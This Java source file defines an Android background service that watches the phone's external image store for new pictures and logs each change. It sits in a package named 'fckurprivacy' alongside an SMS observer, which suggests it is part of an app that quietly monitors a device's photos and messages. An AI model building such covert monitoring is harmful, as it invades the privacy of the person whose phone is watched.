package com.vergermiya.harevost.fckurprivacy.ImageChecker;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.MediaStore;
import android.util.Log;

import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;

public class ImageCheckService extends Service {

    private ImageContentObserver mImageContentObserver;

    public ImageCheckService() {
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startImageCheckService();
        return START_REDELIVER_INTENT;
    }

    public void startImageCheckService() {
        mImageContentObserver = new ImageContentObserver(this, new Handler() {
            @Override
            public void handleMessage(Message msg) {
                if (msg.what == 0x110) {
                    Log.i("Image", "message is back! " + msg.obj.toString());
                }
            }
        });
        getContentResolver().registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, mImageContentObserver);
    }
}
